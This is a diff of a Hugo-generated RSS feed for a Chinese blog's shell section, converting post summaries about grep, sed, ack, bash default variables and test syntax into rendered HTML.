@@ -9,225 +9,810 @@
       <url>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
       <link>https://wdd.js.org/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
     </image>
-    <generator>Hugo -- gohugo.io</generator>
+    <generator>Hugo -- 0.143.1</generator>
     <language>en</language>
-    <lastBuildDate>Sun, 05 Jun 2022 00:00:00 +0800</lastBuildDate><atom:link href="https://wdd.js.org/shell/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 05 Jun 2022 00:00:00 +0800</lastBuildDate>
+    <atom:link href="https://wdd.js.org/shell/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>grep常用参考</title>
       <link>https://wdd.js.org/shell/grep-docs/</link>
       <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/grep-docs/</guid>
-      <description>1. grep 常用参数 参考： GNU Grep 3.0
---color:高亮显示匹配到的字符串 -v：显示不能被pattern匹配到的 -i：忽略字符大小写 -o：仅显示匹配到的字符串 -q：静默模式，不输出任何信息 -A#：after，匹配到的后#行 -B#：before，匹配到的前#行 -C#：context，匹配到的前后各#行 -E：使用ERE，支持使用扩展的正则表达式 －c：只输出匹配行的计数。 －I：不区分大 小写(只适用于单字符)。 －h：查询多文件时不显示文件名。 －l：查询多文件时只输出包含匹配字符的文件名。 －n：显示匹配行及 行号。 - m: 匹配多少个关键词之后就停止搜索 －s：不显示不存在或无匹配文本的错误信息。 －v：显示不包含匹配文本的所有行。 2. 普通：搜索trace.log 中含有ERROR字段的日志 grep ERROR trace.log 3. 输出文件：可以将日志输出文件中 grep ERROR trace.log &amp;gt; error.log 4. 反向：搜索不包含ERROR字段的日志 grep -v ERROR trace.log 5. 向前：搜索包含ERROR,并且显示ERROR前10行的日志 grep -B 10 ERROR trace.log 6. 向后：搜索包含ERROR字段，并且显示ERROR后10行的日志 grep -A 10 ERROR trace.log 7. 上下文：搜索包含ERROR字段，并且显示ERROR字段前后10行的日志 grep -C 10 ERROR trace.log 8. 多字段：搜索包含ERROR和DEBUG字段的日志 gerp -E &amp;#39;ERROR|DEBUG&amp;#39; trace.</description>
+      <description>&lt;h1 id=&#34;1-grep-常用参数&#34;&gt;1. grep 常用参数&lt;/h1&gt;
+&lt;p&gt;参考： GNU Grep 3.0&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;--color:高亮显示匹配到的字符串
+-v：显示不能被pattern匹配到的
+-i：忽略字符大小写
+-o：仅显示匹配到的字符串
+-q：静默模式，不输出任何信息
+-A#：after，匹配到的后#行
+-B#：before，匹配到的前#行
+-C#：context，匹配到的前后各#行
+-E：使用ERE，支持使用扩展的正则表达式
+－c：只输出匹配行的计数。
+－I：不区分大 小写(只适用于单字符)。
+－h：查询多文件时不显示文件名。
+－l：查询多文件时只输出包含匹配字符的文件名。
+－n：显示匹配行及 行号。
+- m: 匹配多少个关键词之后就停止搜索
+－s：不显示不存在或无匹配文本的错误信息。
+－v：显示不包含匹配文本的所有行。
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-普通搜索tracelog-中含有error字段的日志&#34;&gt;2. 普通：搜索trace.log 中含有ERROR字段的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-输出文件可以将日志输出文件中&#34;&gt;3. 输出文件：可以将日志输出文件中&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR trace.log &amp;gt; error.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-反向搜索不包含error字段的日志&#34;&gt;4. 反向：搜索不包含ERROR字段的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -v ERROR trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;5-向前搜索包含error并且显示error前10行的日志&#34;&gt;5. 向前：搜索包含ERROR,并且显示ERROR前10行的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -B 10 ERROR trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;6-向后搜索包含error字段并且显示error后10行的日志&#34;&gt;6. 向后：搜索包含ERROR字段，并且显示ERROR后10行的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -A 10 ERROR trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;7-上下文搜索包含error字段并且显示error字段前后10行的日志&#34;&gt;7. 上下文：搜索包含ERROR字段，并且显示ERROR字段前后10行的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep -C 10 ERROR trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;8-多字段搜索包含error和debug字段的日志&#34;&gt;8. 多字段：搜索包含ERROR和DEBUG字段的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;gerp -E &amp;#39;ERROR|DEBUG&amp;#39; trace.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;9-多文件从多个log文件中搜索含有error的日志&#34;&gt;9. 多文件：从多个.log文件中搜索含有ERROR的日志&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;grep ERROR *.log
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;10-省略文件名从多个log文件中搜索error字段日志并不显示日志文件名&#34;&gt;10. 省略文件名：从多个.log文件中搜索ERROR字段日志，并不显示日志文件名&lt;/h1&gt;
+&lt;p&gt;从多个文件中搜索的日志默认每行会带有日志文件名&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>Shell 书籍和资料收藏</title>
       <link>https://wdd.js.org/shell/star-collect/</link>
       <pubDate>Sun, 05 Jun 2022 00:00:00 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/star-collect/</guid>
-      <description>shell 自动化测试 https://github.com/bats-core/bats-core shell精进 https://github.com/NARKOZ/hacker-scripts https://github.com/trimstray/the-book-of-secret-knowledge https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing https://github.com/dylanaraps/pure-bash-bible https://github.com/dylanaraps/pure-sh-bible https://github.com/Idnan/bash-guide https://github.com/denysdovhan/bash-handbook https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html https://github.com/jlevy/the-art-of-command-line https://google.github.io/styleguide/shell.xml https://wiki.bash-hackers.org/start https://linuxguideandhints.com/ 安全加固 https://www.lisenet.com/2017/centos-7-server-hardening-guide/ https://highon.coffee/blog/security-harden-centos-7/ https://github.com/trimstray/the-practical-linux-hardening-guide https://github.com/decalage2/awesome-security-hardening https://www.hackingarticles.in/ https://github.com/toniblyx/my-arsenal-of-aws-security-tools </description>
+      <description>&lt;h1 id=&#34;shell-自动化测试&#34;&gt;shell 自动化测试&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/bats-core/bats-core&#34;&gt;https://github.com/bats-core/bats-core&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;shell精进&#34;&gt;shell精进&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/NARKOZ/hacker-scripts&#34;&gt;https://github.com/NARKOZ/hacker-scripts&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/trimstray/the-book-of-secret-knowledge&#34;&gt;https://github.com/trimstray/the-book-of-secret-knowledge&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing&#34;&gt;https://legacy.gitbook.com/book/learnbyexample/command-line-text-processing&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/dylanaraps/pure-bash-bible&#34;&gt;https://github.com/dylanaraps/pure-bash-bible&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/dylanaraps/pure-sh-bible&#34;&gt;https://github.com/dylanaraps/pure-sh-bible&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/Idnan/bash-guide&#34;&gt;https://github.com/Idnan/bash-guide&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/denysdovhan/bash-handbook&#34;&gt;https://github.com/denysdovhan/bash-handbook&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html&#34;&gt;https://pubs.opengroup.org/onlinepubs/9699919799/utilities/contents.html&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line&#34;&gt;https://github.com/jlevy/the-art-of-command-line&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://google.github.io/styleguide/shell.xml&#34;&gt;https://google.github.io/styleguide/shell.xml&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://wiki.bash-hackers.org/start&#34;&gt;https://wiki.bash-hackers.org/start&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://linuxguideandhints.com/&#34;&gt;https://linuxguideandhints.com/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;安全加固&#34;&gt;安全加固&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.lisenet.com/2017/centos-7-server-hardening-guide/&#34;&gt;https://www.lisenet.com/2017/centos-7-server-hardening-guide/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://highon.coffee/blog/security-harden-centos-7/&#34;&gt;https://highon.coffee/blog/security-harden-centos-7/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/trimstray/the-practical-linux-hardening-guide&#34;&gt;https://github.com/trimstray/the-practical-linux-hardening-guide&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/decalage2/awesome-security-hardening&#34;&gt;https://github.com/decalage2/awesome-security-hardening&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.hackingarticles.in/&#34;&gt;https://www.hackingarticles.in/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/toniblyx/my-arsenal-of-aws-security-tools&#34;&gt;https://github.com/toniblyx/my-arsenal-of-aws-security-tools&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
     </item>
-    
     <item>
       <title>sed替换</title>
       <link>https://wdd.js.org/shell/sed-tips/</link>
       <pubDate>Thu, 08 Jul 2021 09:17:30 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/sed-tips/</guid>
-      <description>直接在原文的基础上修改 sed -i &amp;#39;s/ABC/abc/g&amp;#39; some.txt 多次替换 方案 1 使用分号 sed &amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39; some.txt 方案 2 多次使用-e sed -e &amp;#39;s/ABC/abc/g&amp;#39; -e &amp;#39;s/DEF/def/g&amp;#39; some.txt 转译/ 如果替换或者被替换的字符中本来就有/, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。
-The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the regexp or replacement only if it is preceded by a \ character. https://www.gnu.org/software/sed/manual/sed.html</description>
+      <description>&lt;h1 id=&#34;直接在原文的基础上修改&#34;&gt;直接在原文的基础上修改&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g&amp;#39;&lt;/span&gt; some.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;多次替换&#34;&gt;多次替换&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;方案 1 使用分号&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g;s/DEF/def/g&amp;#39;&lt;/span&gt; some.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;方案 2 多次使用-e&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sed -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/ABC/abc/g&amp;#39;&lt;/span&gt; -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/DEF/def/g&amp;#39;&lt;/span&gt; some.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;转译&#34;&gt;转译/&lt;/h1&gt;
+&lt;p&gt;如果替换或者被替换的字符中本来就有&lt;code&gt;/&lt;/code&gt;, 那么替换就会无法达到预期效果，那么我们可以用其他的字符来替代/。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The / characters may be uniformly replaced by any other single character within any given s command. The / character (or whatever other character is used in its stead) can appear in the &lt;em&gt;regexp&lt;/em&gt; or &lt;em&gt;replacement&lt;/em&gt; only if it is preceded by a \ character.
+&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://www.gnu.org/software/sed/manual/sed.html&#34;&gt;https://www.gnu.org/software/sed/manual/sed.html&lt;/a&gt;&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>Ack 在contab中无法查到关键词</title>
       <link>https://wdd.js.org/shell/contab-ack/</link>
       <pubDate>Fri, 18 Jun 2021 00:00:00 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/contab-ack/</guid>
-      <description>手工执行，可以获得预期结果，但是在crontab中，却查不到结果。
-stage_count=$(ack -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 最终使用--nofilter参数，解决了问题。
-stage_count=$(ack --nofilter -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l) 参考
-https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline </description>
+      <description>&lt;p&gt;手工执行，可以获得预期结果，但是在crontab中，却查不到结果。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stage_count=$(ack -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;最终使用&lt;code&gt;--nofilter&lt;/code&gt;参数，解决了问题。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;stage_count=$(ack --nofilter -h &amp;#34;\- name:&amp;#34; -t yaml | wc -l)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline&#34;&gt;https://stackoverflow.com/questions/55777520/ack-fails-in-cronjob-but-runs-fine-from-commandline&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
     </item>
-    
     <item>
       <title>设置变量默认值</title>
       <link>https://wdd.js.org/shell/default-var/</link>
       <pubDate>Wed, 03 Jun 2020 18:44:33 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/default-var/</guid>
-      <description>用法 Parameter What does it do? ${VAR:-STRING} If VAR is empty or unset, use STRING as its value. ${VAR-STRING} If VAR is unset, use STRING as its value. ${VAR:=STRING} If VAR is empty or unset, set the value of VAR to STRING. ${VAR=STRING} If VAR is unset, set the value of VAR to STRING. ${VAR:+STRING} If VAR is not empty, use STRING as its value. ${VAR+STRING} If VAR is set, use STRING as its value.</description>
+      <description>&lt;h2 id=&#34;用法&#34;&gt;用法&lt;/h2&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th&gt;Parameter&lt;/th&gt;
+          &lt;th&gt;What does it do?&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR:-STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is empty or unset, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR-STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is unset, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR:=STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is empty or unset, set the value of &lt;code&gt;VAR&lt;/code&gt; to &lt;code&gt;STRING&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR=STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is unset, set the value of &lt;code&gt;VAR&lt;/code&gt; to &lt;code&gt;STRING&lt;/code&gt;.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR:+STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is not empty, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR+STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;If &lt;code&gt;VAR&lt;/code&gt; is set, use &lt;code&gt;STRING&lt;/code&gt; as its value.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR:?STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Display an error if empty or unset.&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td&gt;&lt;code&gt;${VAR?STRING}&lt;/code&gt;&lt;/td&gt;
+          &lt;td&gt;Display an error if unset.&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;
+&lt;h1 id=&#34;例子&#34;&gt;例子&lt;/h1&gt;
+&lt;p&gt;执行下面的例子，如果环境变量中 CONF 的值存在，则取 CONF 的值，否则用默认值 7&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>比较与测试</title>
       <link>https://wdd.js.org/shell/cond-test/</link>
       <pubDate>Mon, 11 May 2020 13:01:07 +0800</pubDate>
-      
       <guid>https://wdd.js.org/shell/cond-test/</guid>
-      <description>if # if if condition; then commands; fi # if else if if condition; then commands; elif condition; then commands; else commands; fi 简单版本的 if 测试
-[ condtion ] &amp;amp;&amp;amp; action; [ conditio ] || action; 算数比较 [ $var -eq 0 ] #当var等于0 [ $var -ne 0 ] #当var不等于0 -gt 大于 -lt 小于 -ge 大于或等于 -le 小于或等于 使用-a, -o 可以组合复杂的测试。
-[ $var -ne 0 -a $var -gt 2 ] # -a相当于并且 [ $var -ne 0 -o $var -gt 2 ] # -o相当于或 文件比较 [ -f $file ] # 如果file是存在的文件路径或者文件名，则返回真 -f 测试文件路径或者文件是否存在 -x 测试文件是否可执行 -e 测试文件是否存在 -c 测试文件是否是字符设备 -b 测试文件是否是块设备 -w 测试文件是否可写 -r 测试文件是否可读 -L 测试文件是否是一个符号链接 字符串比较 字符串比较一定要用双中括号。</description>
+      <description>&lt;h1 id=&#34;if&#34;&gt;if&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if else if&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单版本的 if 测试&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; condtion &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; action;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; conditio &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; action;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;算数比较&#34;&gt;算数比较&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -eq &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#当var等于0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;#当var不等于0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;-gt 大于&lt;/li&gt;
+&lt;li&gt;-lt 小于&lt;/li&gt;
+&lt;li&gt;-ge 大于或等于&lt;/li&gt;
+&lt;li&gt;-le 小于或等于&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用-a, -o 可以组合复杂的测试。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -a $var -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# -a相当于并且&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; $var -ne &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; -o $var -gt &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# -o相当于或&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;文件比较&#34;&gt;文件比较&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; -f $file &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 如果file是存在的文件路径或者文件名，则返回真&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;-f 测试文件路径或者文件是否存在&lt;/li&gt;
+&lt;li&gt;-x 测试文件是否可执行&lt;/li&gt;
+&lt;li&gt;-e 测试文件是否存在&lt;/li&gt;
+&lt;li&gt;-c 测试文件是否是字符设备&lt;/li&gt;
+&lt;li&gt;-b 测试文件是否是块设备&lt;/li&gt;
+&lt;li&gt;-w 测试文件是否可写&lt;/li&gt;
+&lt;li&gt;-r 测试文件是否可读&lt;/li&gt;
+&lt;li&gt;-L 测试文件是否是一个符号链接&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;字符串比较&#34;&gt;字符串比较&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;字符串比较一定要用双中括号。&lt;/strong&gt;&lt;/p&gt;</description>
     </item>
-    
     <item>
       <title>常用shell技巧</title>
       <link>https://wdd.js.org/shell/all-in-one/</link>
